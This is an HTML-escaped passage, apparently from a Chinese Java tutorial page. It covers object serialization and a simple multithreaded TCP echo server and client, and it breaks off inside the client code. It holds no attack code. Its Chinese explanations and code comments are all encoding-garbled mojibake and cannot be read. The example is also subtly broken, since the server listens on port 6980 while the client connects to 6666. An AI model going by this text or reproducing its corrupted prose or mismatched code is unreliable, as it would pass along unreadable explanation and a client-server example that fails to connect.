&lt;p>åºåˆ—åŒ–æ˜¯æŒ‡æŠŠä¸€ä¸ªJavaå¯¹è±¡å˜æˆäºŒè¿›åˆ¶å†…å®¹ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª&lt;code>byte[]&lt;/code>æ•°ç»„&lt;/p>
&lt;p>ä¸€ä¸ªJavaå¯¹è±¡è¦èƒ½åºåˆ—åŒ–ï¼Œå¿…é¡»å®žçŽ°ä¸€ä¸ªç‰¹æ®Šçš„&lt;code>java.io.Serializable&lt;/code>æŽ¥å£(æ ‡è®°æŽ¥å£Marker Interface)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">interface&lt;/span> &lt;span style="color:#75af00">Serializable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ååºåˆ—åŒ–æ—¶ï¼Œç”±JVMç›´æŽ¥æž„é€ å‡ºJavaå¯¹è±¡ï¼Œä¸è°ƒç”¨æž„é€ æ–¹æ³•ï¼Œæž„é€ æ–¹æ³•å†…éƒ¨çš„ä»£ç ï¼Œåœ¨ååºåˆ—åŒ–æ—¶æ ¹æœ¬ä¸å¯èƒ½æ‰§è¡Œï¼ˆåŒPHPï¼‰ï¼Œå¯è®¾ç½®&lt;code>serialVersionUID&lt;/code>ä½œä¸ºç‰ˆæœ¬å·&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">2709425275741743919L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¯ä»¥é¿å…classå®šä¹‰å˜åŠ¨å¯¼è‡´çš„ä¸å…¼å®¹ï¼Œé€šå¸¸å¯ä»¥ç”±IDEè‡ªåŠ¨ç”Ÿæˆ&lt;/p>
&lt;h2 id="ç½‘ç»œç¼–ç¨‹">ç½‘ç»œç¼–ç¨‹&lt;/h2>
&lt;h3 id="socket---tcp">Socket - TCP&lt;/h3>
&lt;p>ä¸€ä¸ªSocketå°±æ˜¯ç”±ipå’Œportæž„æˆï¼ŒSocketç¼–ç¨‹å°±æ˜¯æŒ‡ä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„ç½‘ç»œé€šä¿¡ï¼ŒServer&amp;amp;Client&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// Server.java
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.*&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.ServerSocket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.net.Socket&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.nio.charset.StandardCharsets&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Server&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ServerSocket&lt;/span> &lt;span style="color:#111">ss&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ServerSocket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">6980&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Server is running...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ss&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">accept&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;connected from &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRemoteSocketAddress&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#111">t&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Handler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#111">ioe&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Client disconnected&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;bye~\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">break&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Socket&lt;/span> &lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Socket&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;localhost&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">6666&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// è¿žæŽ¥æŒ‡å®šæœåŠ¡å™¨å’Œç«¯å£
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getInputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getOutputStream&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;disconnected.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InputStream&lt;/span> &lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">OutputStream&lt;/span> &lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">writer&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OutputStreamWriter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">output&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">var&lt;/span> &lt;span style="color:#111">reader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">BufferedReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InputStreamReader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">input&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">StandardCharsets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UTF_8&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Scanner&lt;/span> &lt;span style="color:#111">scanner&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Scanner&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">in&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;[server] &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">reader&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readLine&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(;;)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;gt;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// æ‰“å°æç¤º
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">scanner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">nextLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// è¯»å–ä¸€è¡Œè¾“å…¥
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">write&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newLine&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">writer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">flush&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
